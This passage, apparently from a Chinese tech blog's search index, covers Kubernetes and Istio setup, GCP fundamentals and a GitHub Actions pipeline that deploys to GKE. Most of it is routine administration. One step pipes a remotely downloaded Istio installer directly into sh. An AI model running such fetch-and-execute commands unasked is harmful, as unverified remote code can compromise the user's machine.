解决办法就是不再连接数据库，而是通过 RESTful API 访问数据库。这里的 RESTful API 实际上就是一种后端即服务 BaaS 了，它提供了访问后端数据库的接口，使得 FaaS 不再需要考虑数据持久化的问题。 BaaS后端 BaaS 化为了降低运维成本，往往会将复杂业务逻辑拆分成单一职责的微服务，形成微服务架构。这就要求各微服务之间相对独立，意味着每个服务的数据库也需要解耦合。对这类分布式数据库而言，最重要的就是解决数据一致性的问题，例如通过消息队列或是 Raft 协议等。 值得一提的是，FaaS 和 BaaS 的底层实际上使用容器技术实现，所以我们可以在本地用 Kubernetes 搭建自己的 Serverless 平台（见后文 Kubernetes 部分）。 缺点 技术尚不成熟，许多云服务商提供的 Serverless 服务存在不少 bug Serverless 平台对开发者来说是个黑盒子，想在上面调试代码、排查问题，需要付出极大成本 同理，Serverless 平台上的运行时环境只支持部分定制 每次部署代码都需要压缩代码后上传，较繁琐 云服务商提供的生态（如代码调试工具）都是封闭的，形成 Vendor-lock；这一点可能可以通过 Serverless、Midway FaaS 等框架解决 Kubernetes架构K8s 用来管理容器集群，它的好处在官方文档里已经写得很清楚了，而它的原理大致可以概括为一张架构图： 通过 CLI 工具 kubectl，我们可以访问到运行在 K8s Master Node 上的 API Server，也是整个集群的核心。Node 实际上是对计算资源的一种抽象，每个 Node 上运行一个或多个 Pod，即应用实例。一般情况下，一个 Pod 上推荐运行一个容器。 在 Master Node 上还有键值数据库 etcd、监视 Pod 的调度器 Scheduler、不同类型的控制器 Controller Manager 以及连接云服务厂商 API 的 Cloud Controller Manager。 而在普通 Node 上则运行了一个 kubelet，负责通知 API Server 容器运行状态。此外，为了让外界能够访问到容器运行的服务，需要用 K8s Service 通过 kube-proxy 暴露该服务。 最后，不同的 K8s 集群之间通过 Namespace 隔离，注意这和上文写容器技术时提到的 Linux Namespace 并非同一概念，尽管思想是相似的。 安装K8s 的安装令人惊讶地简单。就像我们在架构图中看到的那样，安装 K8s 主要分为安装 kubectl 和 安装 K8s 集群两个步骤。 安装 K8s 集群第一种方式是通过 Docker Desktop 安装。实际上 Docker Desktop 自带了 K8s（不是最新版本，但也比较新），在设置里勾选即可。 第二种方式是通过 kubeadm、minikube、kind 等工具安装，无论哪种方式都比较简单，这里以 minikube 为例。 minikube 内置了 kubectl，所以之后可以选择不另外安装 kubectl。 按照官方文档，直接 install 二进制文件即可。 12curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-darwin-amd64sudo install minikube-darwin-amd64 /usr/local/bin/minikube 安装 kubectlbrew install kubectl，没了。 然而需要注意的是，kubectl 版本和 K8s 集群版本之间相差不能超过 0.0.2，否则容易出现不兼容的情况。例如，如果用 Docker Desktop 安装的 1.21.4 版本的集群，则需要手动安装： 1234curl -LO &quot;https://dl.k8s.io/release/v1.21.4/bin/darwin/arm64/kubectl&quot;chmod +x ./kubectlsudo mv ./kubectl /usr/local/bin/kubectlsudo chown root: /usr/local/bin/kubectl 实践首先设置好别名，方便后续操作（这里直接使用了 minikube 内置的 kubectl）： 12345678alias k=&quot;minikube kubectl --&quot;alias dps=&quot;docker ps -a&quot;alias dr=&quot;docker rm -f&quot;alias dil=&quot;docker image ls&quot;alias dir=&quot;docker image rm&quot;alias ds=&quot;docker start&quot;alias dx=&quot;docker exec -it&quot;alias mk=&quot;minikube&quot; 启动 minikube： 1mk start 部署应用并检查： 12345k create deploy echo-server --image=k8s.gcr.io/echoserver-arm:1.8k get deploy# result:NAME READY UP-TO-DATE AVAILABLE AGEecho-server 1/1 1 1 1m 因为是 M1 芯片，所以用的 ARM 镜像。 检查 Pod 情况： 1234k get po# result:NAME READY STATUS RESTARTS AGEecho-server-9f4db688c-r288r 1/1 Running 0 89 暴露服务并检查： 123456k expose deploy echo-server --type=LoadBalancer --port=8080k get svc# result:NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEecho-server LoadBalancer 10.111.217.237 &lt;pending&gt; 8080:31389/TCP 1mkubernetes ClusterIP 10.96.0.1 &lt;none&gt; 443/TCP 100m 这里暴露了一个 LoadBalancer 类型的服务，也可以换成 NodePort 类型服务。8080 是我们的 echoserver 容器内的服务端口。 此外，可以发现还有一个 kubernetes 服务，这就是 K8s 集群的 API Server。 为了访问暴露的服务，可以手动端口转发，也可以通过 minikube 自动访问： 1mk service echo-server 注意到上面 echo-server 的 EXTERNAL-IP 还在等待分配，我们还可以用 mk tunnel 建立隧道从而分配外部访问的 IP。 上述信息也可以通过 Dashboard 图形化界面查看： 1mk dashboard 有趣的是，K8s 服务也是由 K8s 自己管理的，它运行在 kube-system 的 Namespace 中。 12345678910111213k get po,svc -n kube-system# result:NAME READY STATUS RESTARTS AGEpod/coredns-78fcd69978-xlh28 1/1 Running 0 141mpod/etcd-minikube 1/1 Running 0 142mpod/kube-apiserver-minikube 1/1 Running 0 142mpod/kube-controller-manager-minikube 1/1 Running 0 142mpod/kube-proxy-gblfw 1/1 Running 0 141mpod/kube-scheduler-minikube 1/1 Running 0 142mpod/storage-provisioner 1/1 Running 1 (141m ago) 142mNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEservice/kube-dns ClusterIP 10.96.0.10 &lt;none&gt; 53/UDP,53/TCP,9153/TCP 142m 对于其他平台，kubectl 命令不变，替换上述 mk 相关命令即可。 Service Mesh微服务架构中，微服务之间必须要通信，导致微服务通信相关代码和业务代码的强耦合。Service Mesh 正是为了抽离出微服务通信的逻辑，让开发者专注于业务代码编写。它在数据面板中通过 Sidecar 劫持微服务 Pod 的流量，从而接管了整个网络通信的功能。 Istio 安装Kubernetes 采用 Istio 作为 Server Mesh，首先下载并安装，安装前记得给 Docker Desktop 或 minikube 分配 8 - 16 G 内存： 123curl -L https://istio.io/downloadIstio | sh -mv istio-1.11.2/bin/istioctl /usr/local/binistioctl install --set profile=demo -y 令人痛心的是，Istio 官方 并不支持、也不打算支持 ARM 架构，因此在 M1 下安装时不能直接使用最后一行命令自动化安装，而需要借助 这个社区版镜像，自己编写 Operator 进行安装： 12345678910111213141516171819202122232425262728293031323334353637383940apiVersion: install.istio.io/v1alpha1kind: IstioOperatormetadata: namespace: istio-system name: arm-istiocontrolplanespec: hub: docker.io/querycapistio profile: demo components: pilot: k8s: # each components have to set this affinity: &amp;affinity nodeAffinity: preferredDuringSchedulingIgnoredDuringExecution: - preference: matchExpressions: - key: beta.kubernetes.io/arch operator: In values: - arm64 - amd64 weight: 2 requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: beta.kubernetes.io/arch operator: In values: - arm64 - amd64 egressGateways: - name: istio-egressgateway k8s: affinity: *affinity enabled: true ingressGateways: - name: istio-ingressgateway k8s: affinity: *affinity enabled: true 将这个 Operator 保存为 install-istio.yml，随后 istioctl install -f ./install-istio.yml 完成安装。 应用部署安装完成后，记得开启 Sidecar 注入来劫持流量： 1k label ns default istio-injection=enabled 随后即可部署应用并查看状态： 12345678910111213141516171819k apply -f samples/bookinfo/platform/kube/bookinfo.yamlk get po# result:NAME READY STATUS RESTARTS AGEdetails-v1-79f774bdb9-ns6gl 2/2 Running 0 76sproductpage-v1-6b746f74dc-qp7mg 2/2 Running 0 76sratings-v1-b6994bb9-mflsk 2/2 Running 0 76sreviews-v1-545db77b95-24tsl 2/2 Running 0 76sreviews-v2-7bf8c9648f-b8bq4 2/2 Running 0 76sreviews-v3-84779c7bbc-hxkxg 2/2 Running 0 76sk get svc# result:NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEdetails ClusterIP 10.102.117.210 &lt;none&gt; 9080/TCP 105skubernetes ClusterIP 10.96.0.1 &lt;none&gt; 443/TCP 27mproductpage ClusterIP 10.101.203.214 &lt;none&gt; 9080/TCP 105sratings ClusterIP 10.105.60.88 &lt;none&gt; 9080/TCP 105sreviews ClusterIP 10.100.137.99 &lt;none&gt; 9080/TCP 105s 最后，检查实际应用是否正常运行： 123k exec &quot;$(k get po -l app=ratings -o jsonpath='{.items[0].metadata.name}')&quot; -c ratings -- curl -sS productpage:9080/productpage | grep -o &quot;&lt;title&gt;.*&lt;/title&gt;&quot;# result:&lt;title&gt;Simple Bookstore App&lt;/title&gt; 上述命令的意思是：在 ratings 对应的 pod 中的 ratings 容器里运行 curl -sS productpage:9080/productpage 发起请求，并在返回的 html 中查找标题。需要这么复杂是因为此时我们的服务还没有外部 IP，只能在集群内部访问。 通过 Ingress 网关让应用能够从外部访问首先部署好设置了网关的应用并检查： 12k apply -f samples/bookinfo/networking/bookinfo-gateway.yamlistioctl analyze 获取主机、http2 端口和 https 端口： 12export INGRESS_HOST=$(k -n istio-system get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].ip}')export INGRESS_PORT=$(k -n istio-system get svc istio-ingressgateway -o jsonpath='{.spec.ports[?(@.name==&quot;http2&quot;)].port}') 如果设置完后 $INGRESS_HOST 为空，说明 LoadBalancer 此时的地址为主机名而不是 IP，只需要修改一下设置即可： 1export INGRESS_HOST=$(k -n istio-system get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].hostname}') 随后访问 http://$INGRESS_HOST:$INGRESS_PORT 即可。 通过 Kiali 查看图形化界面安装 Kiali、Prometheus、Grafana、Jarger 等插件，检查部署状态： 12k apply -f samples/addons/k rollout status deploy kiali -n istio-system 随后就可以查看图形化界面了： 1istioctl dashboard kiali 编写脚本产生流量： 123for i in $(seq 1 100); do curl -s -o /dev/null &quot;http://localhost/productpage&quot;;done 最后就可以看到整个 Service Mesh 的架构、以及网络请求数据流了，非常清晰。","link":"/post/Container/"},{"title":"Google Cloud Platform 基础","text":"待更新。 云计算是什么？ 可以在任何时间自助地获取计算资源，无需人工干预； 可以在任何地点访问这些计算资源； 云服务商拥有计算资源池，并从池中分配资源给用户； 计算资源可以弹性收缩； 按量计费，停止使用即停止收费。 GCP 地域和区域地域（Zone）是一块 GCP 资源的部署区，不过不一定是一个类似数据中心的单一的建筑。若干个地域组成了区域（Region），同一区域内的不同地域之间网络通信速度极快。可以认为，一个地域就是一个区域内的故障域。为了提高容灾性能，可以进行多地域部署。 更进一步，为了防止类似自然灾害等不可抗力造成的数据损失，还可以进行多区域部署（区域之间至少相隔 160 km）。 GCP 资源层级树 每个 GCP 计算资源（Resource）属于且仅属于一个项目（Project）。若干个项目可以组成文件夹（Folder），而文件夹通过层级树结构（和文件系统类似）从属于一个组织（Organization）。创建文件夹和组织并不是必须的，但创建文件夹前需要先创建组织。 Project 标识符 标识符 唯一性 标识符来源 可变性 Project ID 全局唯一 用户可指定 不可变 Project name 无需唯一 用户可指定 可变 Project number 全局唯一 GCP 分配 不可变 IAM 策略IAM 策略规定了： 谁 对哪些资源 可以做什么 其中，“谁”部分可以针对： Google 账号 Google 群组 服务账号 G Suite Cloud Identity Domain “对哪些资源”部分比较简单，就是上面提到的任何资源节点（Resource / Project / Folder / Organization, etc.）。 “可以做什么”部分由 IAM 角色定义。 IAM 角色是一系列权限的集合，可以分为三种角色： Primitive Role 只能应用到整个 Project，分为 Owner / Editor / Viewer / Billing administrator 四个角色，所拥有的权限显而易见； Predefined Role 是 GCP 服务中预定义的一些角色，可以应用到 Resource / Project / Folder / Organization 层甚至是某个资源实例上，粒度更细。 Custom Role 只能应用到 Project 或 Organization，由用户自定义，粒度较 Predefined Role 更细。 如果要授予权限给某个计算资源而不是一个用户，就需要针对该计算资源创建一个服务账号，将权限授予该服务账号。同时，服务账号本身也是一种 GCP 资源，因此 IAM 策略也可以应用到服务账号上，实现对服务账号本身的管理。 策略继承IAM 策略可以应用到任何资源节点，并且会自顶向下继承。比较反直觉的是，当顶层策略和底层策略冲突时，两者中更宽松的策略会生效。 🌰 :one: Project 层策略规定某用户对某资源拥有修改权限 Organization 层策略规定该用户对该资源仅拥有读取权限 前者更宽松，因此生效 🌰 :two: Project 层策略规定某用户对某资源拥有修改权限 Resource 层策略规定该用户对该资源仅拥有读取权限 前者更宽松，因此生效 可以看到，发生冲突时，一个 IAM 策略是否生效与其所在层级无关，仅与其是否更为宽松有关。 云上虚拟机Virtual Private Cloud NetworkVPC 用于在虚拟机（Compute Engine）之间构建网络，例如进行网段划分、防火墙设置、静态路由设置等。值得注意的是，VPC 是全局资源，是可以跨区域的，而 VPC 中创建的子网也可以跨地域。 类似物理网络，VPC 会维护一个路由表用于在虚拟机之间寻找路由，VPC 之间也可以互联。此外，VPC 还提供了分别针对区域内、外部流量的负载均衡、DNS 服务、CDN 服务等等。 Compute Engine 实践 在 Compute Engine 里创建新的 VM instance，命名为 my-vm-1，允许 HTTP 入站流量。 由于 my-vm-1 在 us-central1-a 地域中，我们在 Cloud Shell 中查找同区域内有哪些地域： 1gcloud compute zones list | grep us-central1 随意选一个不同的地域，例如 us-central1-b，并修改当前地域： 1gcloud config set compute/zone us-central1-b 创建第二个虚拟机： 12345gcloud compute instances create &quot;my-vm-2&quot; \\--machine-type &quot;n1-standard-1&quot; \\--image-project &quot;debian-cloud&quot; \\--image-family &quot;debian-10&quot; \\--subnet &quot;default&quot; 退出 Cloud Shell，SSH 到 my-vm-2，然后 ping 一下 my-vm-1，注意主机名： 1ping my-vm-1.us-central1-a 在 my-vm-2 上连接 my-vm-1： 1ssh my-vm-1.us-central1-a 在 my-vm-1 里上线一个网页并测试： 123sudo apt-get install nginx-light -ysudo vim /var/www/html/index.nginx-debian.htmlcurl http://localhost 退出 SSH 回到 my-vm-2，访问 my-vm-1 上的网页： 1curl http://my-vm-1.us-central1-a/ 云上存储Cloud Storage常见的对象存储，上传文件，返回一个唯一的 URL。上传的文件按桶（bucket）组织，一旦上传便不可修改（但可以更新），访问权限则由 Cloud IAM 或更细粒度的 ACL 来控制。 Cloud Bigtable &amp; Cloud DatastoreCloud Bigtable 提供存储大量数据的 NoSQL 数据库服务，因为采用 key-value 对存储所以也可以当持久化的哈希表来用。可以通过开源的 HBase API 访问，因此也兼容 Apache Hadoop 生态。 Cloud Datastore 则是应用特化型的 NoSQL，区别主要在于对交易和类 SQL 查询的支持。当然，最重要的是有每日免费用量。 Cloud SQL &amp; Cloud SpannerCloud SQL 提供基于 MySQL 或 PostgreSQL 的 SQL 数据库服务，并配有冗余备份、容灾恢复等功能。而 Cloud Spanner 则可以认为是高配版的 Cloud SQL，在数据一致性和可用性方面都更优秀。 对比 BigQuery 主要用于数据处理而不是数据存储，会在下文介绍。 Cloud Storage &amp; Cloud SQL 实践 在 Compute Engine 里创建新的 VM instance，命名为 blogpost，允许 HTTP 入站流量，并在启动脚本中安装服务器： 123apt-get updateapt-get install apache2 php php-mysql -yservice apache2 restart 在 Cloud Shell 中创建 Cloud Storage，注意 bucket 名称需要唯一，可以用 Project ID来确保这一点： 1gsutil mb -l US gs://$DEVSHELL_PROJECT_ID 从另一个桶中复制一张图片到 Cloud Shell： 12gsutil cp gs://cloud-training/gcpfci/my-excellent-blog.png my-excellent-blog.pngls 从 Cloud Shell 复制图片到新创建的桶： 1gsutil cp my-excellent-blog.png gs://$DEVSHELL_PROJECT_ID/my-excellent-blog.png 检查是否成功： 1gsutil ls gs://$DEVSHELL_PROJECT_ID 在控制台创建和 blogpost 同区域的 Cloud SQL，命名为 blog-db，并设置root密码；创建完毕后，新建一个用户，设置用户名和密码。 接下来，要让我们的 blog-db 只能被 blogpost 访问。为此，先查看 blogpost 的公网 IP，然后在 blog-db 配置面板的 Connections 选项卡里新建一个 Authorized Network，并填入这个 IP。由于要求 CIDR 格式而我们只想要单个机器能访问，填入 x.x.x.x/32 即可。 随后要让 blogpost 去使用 blog-db。SSH 到 blogpost，编写 /var/www/html/index.php： 12345678910111213141516171819&lt;html&gt;&lt;head&gt;&lt;title&gt;Welcome to my excellent blog&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Welcome to my excellent blog&lt;/h1&gt;&lt;?php $dbserver = &quot;CLOUDSQLIP&quot;;$dbuser = &quot;blogdbuser&quot;;$dbpassword = &quot;DBPASSWORD&quot;;// In a production blog, we would not store the MySQL// password in the document root. Instead, we would store it in a// configuration file elsewhere on the web server VM instance.$conn = new mysqli($dbserver, $dbuser, $dbpassword);if (mysqli_connect_error()) { echo (&quot;Database connection failed: &quot; . mysqli_connect_error());} else { echo (&quot;Database connection succeeded.&quot;);}?&gt;&lt;/body&gt;&lt;/html&gt; 重启 apache2，访问 blogpost 的公网 IP，检查数据库连接。 接下来把之前那张图片加到网站上。在控制台 Storage -&gt; Cloud Storage -&gt; Browser 里找到图片，勾选 Share publicly 从而获得一个 URL（或者运行下面的命令）。随后在原来的 html 里插入图片即可。 1gsutil acl ch -u allUsers:R gs://$DEVSHELL_PROJECT_ID/my-excellent-blog.png 重复第 9 步。 云上容器也就是 Google Kubernetes Engine，后面单独开篇博客写。 云上应用云上部署云上数据处理","link":"/post/GCP/"},{"title":"从 Dockerfile 到 GKE：再探 GitHub Actions","text":"GitHub Actions 还可以配合 Issue 用来做开源社区的无聊小游戏，这就留到《三探 GitHub Actions》再说了。 背景和上回类似，我这次又遇到了一些机械重复的操作。当我写完一个 Go 应用，想发布在公网上供访问、同时保证高可用性时，我需要： 运行 go build，附带一堆参数 运行 docker build 打包 Docker 镜像 运行 docker run 测试镜像是否可用，存在问题则回到第 1 步之前 运行 docker ps 和 docker rm 清理容器 运行 docker push 发布镜像 运行 docker image ls 和 docker image rm 清理镜像 在 Google Kubernetes Engine 里打开 Cloud Shell 运行 kubectl create deploy 创建 deploy 运行 kubectl expose deploy 创建 service 这实在是太麻烦了。不过和上次不同，这次的步骤和参数都复杂了许多，因此多花了些时间。 编写 Dockerfile我这里使用了 Muti-stage 的方式，先编译后部署，实际上也可以写一个脚本，本地编译后直接运行第二阶段。 12345678910FROM golang:1.17.1 AS builderRUN mkdir /appADD . /appWORKDIR /appRUN mkdir bin &amp;&amp; CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -trimpath -ldflags=&quot;-w -s&quot; -gcflags &quot;-N -l&quot; -o bin/httpserverFROM alpine AS productionCOPY --from=builder /app/bin/* .CMD [&quot;./httpserver&quot;, &quot;:8080&quot;] 需要注意的是，alpine 所采用的 musl libc 会影响到使用默认配置编译的 go 二进制文件，因此必须设置 CGO_ENABLED=0。 写好上面的 Dockerfile 后，x64 机器就可以直接打包镜像了，但 M1 不行，因为 M1 上的 Docker 无论 pull 还是 build 都默认用 ARM 版本的镜像。为了解决这个问题，可以用 buildx 辅助编译： 1docker buildx build --platform linux/amd64 --push -t httpserver . buildx 还可以声明多个平台，用逗号隔开。当然此时也需要 go 编译多个平台的二进制文件。 不过最方便的办法当然是使用 GitHub Actions 啦。由于和 GCP 融合，我们选择把镜像上传到 Google Container Registry，因此 Actions 脚本会有些变化： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152name: Build and Deploy to GKEon: push: branches: - mainenv: PROJECT_ID: ${{ secrets.GKE_PROJECT }} GKE_CLUSTER: cluster-1 GKE_ZONE: us-central1-c DEPLOYMENT_NAME: httpserver IMAGE: httpserverjobs: setup-build-publish-deploy: name: Setup, Build, Publish and Deploy runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v2 # Setup gcloud CLI # ... # Configure Docker to use the gcloud command-line tool as a credential # helper for authentication # ... # Get the GKE credentials so we can deploy to the cluster # ... # Build the Docker image - name: Build run: |- docker build \\ --tag &quot;gcr.io/$PROJECT_ID/$IMAGE:$GITHUB_SHA&quot; \\ --build-arg GITHUB_SHA=&quot;$GITHUB_SHA&quot; \\ --build-arg GITHUB_REF=&quot;$GITHUB_REF&quot; \\ . # Push the Docker image to Google Container Registry, maybe need storage admin role? - name: Publish run: |- docker push &quot;gcr.io/$PROJECT_ID/$IMAGE:$GITHUB_SHA&quot; # Set up kustomize # ... # Deploy the Docker image to the GKE cluster # ... 上面省略了 GKE 相关的一些配置，我们会在下面介绍。可以看到，此时我们用 $GITHUB_SHA$ 作为我们镜像的 tag，这是因为部署到 Kubernetes 时需要明确指定一个 tag 而不是用默认的 latest。 配置 GCP首先安装好 gcloud： 12345# Setup gcloud CLI- uses: google-github-actions/setup-gcloud@v0.2.0 with: service_account_key: ${{ secrets.GKE_SA_KEY }} project_id: ${{ secrets.GKE_PROJECT }} 这里的 GKE_PROJECT 就是 GKE 所在的项目的 Project ID，GKE_SA_KEY 是在 GCP 上执行后续操作的 Service Account 的密钥。这个密钥可以在创建 Service Account 后在“密钥”选项卡生成，需要的是 JSON 格式的密钥，且需要进行 Base64 编码后填入 secrets。 随后登录 Container Registry： 1234# Configure Docker to use the gcloud command-line tool as a credential# helper for authentication- run: |- gcloud --quiet auth configure-docker 这一步会利用上面的 Service Account 登录 Container Registry。由于后续要上传镜像，涉及到了 create bucket 的操作，我们需要在创建 Service Account 时授予 Storage Admin 或类似的拥有 create bucket 权限的角色（Storage Admin 权限很高，这样做并不符合最小特权原则）。除此之外，显然 Service Account 还需要 Kubernetes Engine Developer 角色才能在后面管理 K8s 集群。 最后获取 GKE 权限： 123456# Get the GKE credentials so we can deploy to the cluster- uses: google-github-actions/get-gke-credentials@v0.2.1 with: cluster_name: ${{ env.GKE_CLUSTER }} location: ${{ env.GKE_ZONE }} credentials: ${{ secrets.GKE_SA_KEY }} 随后就是上面看到的 Build 和 Publish 操作了。 Customize kustomize最后一步就是使用 kustomize 来搭建 deploy。在打包镜像时有一个很明显的问题，那就是镜像的 tag 在每次 Actions 执行时都是动态的，我们并不清楚其具体值，也无法把他写进 deployment.yml 里。因此我们可以先这样写： 1234567891011121314151617181920212223242526272829303132333435363738394041apiVersion: apps/v1kind: Deploymentmetadata: name: httpserverspec: replicas: 3 selector: matchLabels: app: httpserver strategy: rollingUpdate: maxSurge: 1 maxUnavailable: 1 minReadySeconds: 5 template: metadata: labels: app: httpserver spec: containers: - name: httpserver image: gcr.io/PROJECT_ID/IMAGE:TAG ports: - containerPort: 8080 resources: requests: cpu: 100m limits: cpu: 100m---apiVersion: v1kind: Servicemetadata: name: httpserver-servicespec: type: LoadBalancer ports: - port: 80 targetPort: 8080 selector: app: httpserver 可以看到 image 部分留了一些像环境变量一样的东西，这就相当于 kustomize 的模版字符串，之后 kustomize 做的事情其实就类似于一个模版引擎。我们编写 kustomization.yml 来让它找到文件的位置： 12345apiVersion: kustomize.config.k8s.io/v1beta1kind: Kustomizationresources: - deployment.yml 这样，配置文件就写好了，最后再加上 Actions 的步骤： 12345678910111213# Set up kustomize- name: Set up Kustomize run: |- curl -sfLo kustomize https://github.com/kubernetes-sigs/kustomize/releases/download/v3.1.0/kustomize_3.1.0_linux_amd64 chmod u+x ./kustomize# Deploy the Docker image to the GKE cluster- name: Deploy run: |- ./kustomize edit set image gcr.io/PROJECT_ID/IMAGE:TAG=gcr.io/$PROJECT_ID/$IMAGE:$GITHUB_SHA ./kustomize build . | kubectl apply -f - kubectl rollout status deployment/$DEPLOYMENT_NAME kubectl get services -o wide 大功告成，可以 push 一下看看 Actions 的运行结果了。运行完成之后，也可以在 GKE 上看到对应的信息。","link":"/post/Dockerfile2GKE/"}],"tags":[{"name":"栈迁移","slug":"栈迁移","link":"/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"},{"name":"fsb","slug":"fsb","link":"/tags/fsb/"},{"name":"uaf","slug":"uaf","link":"/tags/uaf/"},{"name":"整数溢出","slug":"整数溢出","link":"/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"},{"name":"double-free","slug":"double-free","link":"/tags/double-free/"},{"name":"Vue","slug":"Vue","link":"/tags/Vue/"},{"name":"项目","slug":"项目","link":"/tags/%E9%A1%B9%E7%9B%AE/"},{"name":"WLAN","slug":"WLAN","link":"/tags/WLAN/"},{"name":"C&#x2F;C++","slug":"C-C","link":"/tags/C-C/"},{"name":"数据结构","slug":"数据结构","link":"/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"古典密码","slug":"古典密码","link":"/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"},{"name":"RSA","slug":"RSA","link":"/tags/RSA/"},{"name":"canary","slug":"canary","link":"/tags/canary/"},{"name":"ROP","slug":"ROP","link":"/tags/ROP/"},{"name":"fastbin-attack","slug":"fastbin-attack","link":"/tags/fastbin-attack/"},{"name":"mprotect","slug":"mprotect","link":"/tags/mprotect/"},{"name":"SROP","slug":"SROP","link":"/tags/SROP/"},{"name":"tcache","slug":"tcache","link":"/tags/tcache/"},{"name":"off-by-one","slug":"off-by-one","link":"/tags/off-by-one/"},{"name":"unlink","slug":"unlink","link":"/tags/unlink/"},{"name":"fastbin-consolidation","slug":"fastbin-consolidation","link":"/tags/fastbin-consolidation/"},{"name":"mmap_thresold","slug":"mmap-thresold","link":"/tags/mmap-thresold/"},{"name":"House-of-Force","slug":"House-of-Force","link":"/tags/House-of-Force/"},{"name":"House-of-Spirit","slug":"House-of-Spirit","link":"/tags/House-of-Spirit/"},{"name":"largebin-attack","slug":"largebin-attack","link":"/tags/largebin-attack/"},{"name":"House-of-Orange","slug":"House-of-Orange","link":"/tags/House-of-Orange/"},{"name":"目录穿越","slug":"目录穿越","link":"/tags/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"},{"name":"SQLi","slug":"SQLi","link":"/tags/SQLi/"},{"name":"堆叠注入","slug":"堆叠注入","link":"/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"},{"name":"tornado","slug":"tornado","link":"/tags/tornado/"},{"name":"文件上传","slug":"文件上传","link":"/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"SSRF","slug":"SSRF","link":"/tags/SSRF/"},{"name":"反序列化","slug":"反序列化","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"位运算","slug":"位运算","link":"/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"},{"name":"总结","slug":"总结","link":"/tags/%E6%80%BB%E7%BB%93/"},{"name":"IoT协议","slug":"IoT协议","link":"/tags/IoT%E5%8D%8F%E8%AE%AE/"},{"name":"Hash","slug":"Hash","link":"/tags/Hash/"},{"name":"Kali","slug":"Kali","link":"/tags/Kali/"},{"name":"Dijkstra","slug":"Dijkstra","link":"/tags/Dijkstra/"},{"name":"状压DP","slug":"状压DP","link":"/tags/%E7%8A%B6%E5%8E%8BDP/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"动态规划","slug":"动态规划","link":"/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"编码","slug":"编码","link":"/tags/%E7%BC%96%E7%A0%81/"},{"name":"搜索","slug":"搜索","link":"/tags/%E6%90%9C%E7%B4%A2/"},{"name":"字符串","slug":"字符串","link":"/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"正则","slug":"正则","link":"/tags/%E6%AD%A3%E5%88%99/"},{"name":"二分图匹配","slug":"二分图匹配","link":"/tags/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%8C%B9%E9%85%8D/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"selenium","slug":"selenium","link":"/tags/selenium/"},{"name":"爬虫","slug":"爬虫","link":"/tags/%E7%88%AC%E8%99%AB/"},{"name":"矩阵","slug":"矩阵","link":"/tags/%E7%9F%A9%E9%98%B5/"},{"name":"快速幂","slug":"快速幂","link":"/tags/%E5%BF%AB%E9%80%9F%E5%B9%82/"},{"name":"数学","slug":"数学","link":"/tags/%E6%95%B0%E5%AD%A6/"},{"name":"最大区间和","slug":"最大区间和","link":"/tags/%E6%9C%80%E5%A4%A7%E5%8C%BA%E9%97%B4%E5%92%8C/"},{"name":"并查集","slug":"并查集","link":"/tags/%E5%B9%B6%E6%9F%A5%E9%9B%86/"},{"name":"区间RMQ","slug":"区间RMQ","link":"/tags/%E5%8C%BA%E9%97%B4RMQ/"},{"name":"MST","slug":"MST","link":"/tags/MST/"},{"name":"ElGamal","slug":"ElGamal","link":"/tags/ElGamal/"},{"name":"ECC","slug":"ECC","link":"/tags/ECC/"},{"name":"前缀和","slug":"前缀和","link":"/tags/%E5%89%8D%E7%BC%80%E5%92%8C/"},{"name":"高精度","slug":"高精度","link":"/tags/%E9%AB%98%E7%B2%BE%E5%BA%A6/"},{"name":"组合数","slug":"组合数","link":"/tags/%E7%BB%84%E5%90%88%E6%95%B0/"},{"name":"FastAPI","slug":"FastAPI","link":"/tags/FastAPI/"},{"name":"OAuth2","slug":"OAuth2","link":"/tags/OAuth2/"},{"name":"CI&#x2F;CD","slug":"CI-CD","link":"/tags/CI-CD/"},{"name":"ORW","slug":"ORW","link":"/tags/ORW/"},{"name":"unsortedbin-attack","slug":"unsortedbin-attack","link":"/tags/unsortedbin-attack/"},{"name":"Docker","slug":"Docker","link":"/tags/Docker/"},{"name":"FRP","slug":"FRP","link":"/tags/FRP/"},{"name":"Redis","slug":"Redis","link":"/tags/Redis/"},{"name":"TortoiseORM","slug":"TortoiseORM","link":"/tags/TortoiseORM/"},{"name":"js","slug":"js","link":"/tags/js/"},{"name":"DNS","slug":"DNS","link":"/tags/DNS/"},{"name":"IPv6","slug":"IPv6","link":"/tags/IPv6/"},{"name":"hexo","slug":"hexo","link":"/tags/hexo/"},{"name":"House-of-Lore","slug":"House-of-Lore","link":"/tags/House-of-Lore/"},{"name":"chunk-overlapping","slug":"chunk-overlapping","link":"/tags/chunk-overlapping/"},{"name":"House-of-Einherjar","slug":"House-of-Einherjar","link":"/tags/House-of-Einherjar/"},{"name":"House-of-Botcake","slug":"House-of-Botcake","link":"/tags/House-of-Botcake/"},{"name":"php","slug":"php","link":"/tags/php/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"MySQL","slug":"MySQL","link":"/tags/MySQL/"},{"name":"Jenkins","slug":"Jenkins","link":"/tags/Jenkins/"